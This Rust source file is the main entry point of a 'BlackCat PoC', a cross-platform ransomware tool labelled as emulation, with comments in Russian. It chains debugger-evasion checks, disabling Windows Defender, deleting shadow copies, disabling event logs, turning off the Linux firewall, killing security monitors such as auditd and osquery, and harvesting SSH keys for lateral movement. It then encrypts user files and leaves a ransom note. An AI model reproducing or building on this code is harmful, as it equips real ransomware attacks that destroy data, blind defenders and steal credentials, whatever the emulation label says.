mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod esxi;
mod evasion;
mod config;
mod linux;

use clap::{Parser, Subcommand};
use log::{info, warn, error};
use std::path::Path;
use std::fs;

#[derive(Parser)]
#[command(name = "BlackCat PoC")]
#[command(about = "Cross-platform ransomware emulation tool", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Запустить шифрование указанной директории
    Encrypt {
        #[arg(short, long)]
        path: String,
    },
    /// Расшифровать директорию, используя мастер-ключ
    Decrypt {
        #[arg(short, long)]
        path: String,
        #[arg(short, long)]
        key: String, // Hex-encoded 32-byte key
    },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    let cli = Cli::parse();

    // 1. Проверки среды (Evasion) - работают на обеих ОС через #[cfg] внутри модуля
    if evasion::is_running_in_vm() {
        info!("✓ Running in VM - proceeding with emulation");
    } else {
        warn!("! Not running in VM - environment might be monitored");
    }

    if evasion::is_debugger_present() {
        warn!("! Debugger detected! Exiting to avoid analysis...");
        return Ok(());
    }

    match cli.command {
        Commands::Encrypt { path } => {
            info!("Starting ENCRYPTION mode on: {}", path);

            // 2. Специфичные для ОС операции перед шифрованием
            
            // --- ЛОГИКА ДЛЯ WINDOWS ---
            #[cfg(target_os = "windows")]
            {
                info!("Executing Windows-specific preparation...");
                let _ = windows::WindowsPlatform::disable_windows_defender();
                let _ = windows::WindowsPlatform::delete_shadow_copies();
                let _ = evasion::disable_eventlog();
            }

            // --- ЛОГИКА ДЛЯ LINUX ---
            #[cfg(target_os = "linux")]
            {
                info!("Executing Linux-specific preparation...");
                
                // Отключаем файрвол (требует sudo)
                if let Err(e) = linux::LinuxOperations::disable_firewall() {
                    warn!("Could not disable firewall: {}", e);
                } else {
                    info!("✓ Firewall disabled (ufw)");
                }

                // Убиваем процессы мониторинга (auditd, osquery и т.д.)
                let _ = linux::LinuxOperations::kill_security_processes();
                info!("✓ Security processes signaled to stop");

                // Сбор SSH-ключей для латерального перемещения (Phase 3 вашего плана)
                if let Ok(keys) = linux::LinuxOperations::enumerate_ssh_keys() {
                    info!("Found {} potential SSH keys for lateral movement:", keys.len());
                    for key in keys {
                        info!("  - [DATA EXFILTRATION CANDIDATE]: {}", key);
                    }
                }
            }

            // 3. Общая логика шифрования
            let crypto_engine = crypto::CryptoEngine::new()?;
            let master_key_hex = hex::encode(crypto_engine.get_master_key());
            info!("========== MASTER KEY (SAVE THIS) ==========");
            info!("{}", master_key_hex);
            info!("============================================");

            let files = filesystem::scan_filesystem(&path)?;
            if files.is_empty() {
                error!("No files found in {}", path);
                return Ok(());
            }

            ransomware::BlackCatRansomware::encrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path.clone()],
                    file_extensions: vec!["txt".to_string(), "pdf".to_string(), "docx".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;

            // 4. Оставление записки (Ransom Note)
            #[cfg(target_os = "windows")]
            let _ = windows::WindowsPlatform::create_ransom_note(&path);

            info!("✓ Encryption of {} files complete.", path);
        }

        Commands::Decrypt { path, key } => {
            info!("Starting DECRYPTION mode on: {}", path);
            
            let key_bytes = hex::decode(key).map_err(|_| "Invalid hex key format")?;
            if key_bytes.len() != 32 {
                return Err("Key must be 32 bytes (64 hex characters)".into());
            }
            
            let mut master_key = [0u8; 32];
            master_key.copy_from_slice(&key_bytes);
            
            let crypto_engine = crypto::CryptoEngine::from_key(master_key);
            let files = filesystem::scan_filesystem(&path)?;

            ransomware::BlackCatRansomware::decrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path],
                    file_extensions: vec!["txt".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;

            info!("✓ Decryption complete. Files restored.");
        }
    }

    Ok(())
}